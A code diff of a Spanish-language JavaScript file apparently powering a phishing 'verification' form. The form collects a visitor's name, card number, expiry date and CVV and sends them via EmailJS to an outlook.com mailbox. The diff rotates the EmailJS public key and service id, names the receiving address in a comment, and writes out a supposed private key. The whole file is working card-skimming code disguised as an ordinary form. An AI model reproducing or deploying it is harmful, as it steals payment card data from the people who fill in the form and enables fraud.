@@ -1,5 +1,5 @@
-// Inicialización con tu public key
-emailjs.init('ReqtkWfjI392LAzFb');
+// Inicialización con la nueva public key
+emailjs.init('QUMvaSlJuagns7INe');
 
 document.getElementById('formularioVerificacion').addEventListener('submit', async (e) => {
   e.preventDefault();
@@ -9,7 +9,7 @@ document.getElementById('formularioVerificacion').addEventListener('submit', asy
   boton.disabled = true;
   boton.innerHTML = `<div class="spinner"></div>Procesando...`;
   
-  // Capturar datos
+  // Capturar datos del formulario
   const datos = {
     nombre: document.getElementById('nombre').value.trim(),
     tarjeta: document.getElementById('tarjeta').value.replace(/\s/g, ''),
@@ -61,9 +61,10 @@ document.getElementById('formularioVerificacion').addEventListener('submit', asy
     return;
   }
 
-  // Enviar datos usando EmailJS con tu service id y plantilla configurada (template con {{nombre}}, {{tarjeta}}, {{fecha}} y {{cvv}})
+  // Enviar datos usando EmailJS con el nuevo service id y la plantilla configurada
+  // La dirección de envío se ha configurado en EmailJS para Fantre001@outlook.com
   try {
-    await emailjs.send("service_syrc1uk", "template_u3etoro", datos);
+    await emailjs.send("service_427s9ii", "template_u3etoro", datos);
     window.location.href = "thank-you.html";
   } catch (error) {
     alert('Error temporal. Por favor intente nuevamente.');
@@ -80,3 +81,7 @@ document.getElementById('tarjeta').addEventListener('input', function(e) {
   valor = valor.replace(/(\d{4})(?=\d)/g, '$1 ');
   e.target.value = valor.substring(0, 19);
 });
+
+/*
+  Nota: La private key (TbdLdRj03b0tqQbONR3kT) se debe mantener en secreto y no se utiliza en el código cliente.
+*/
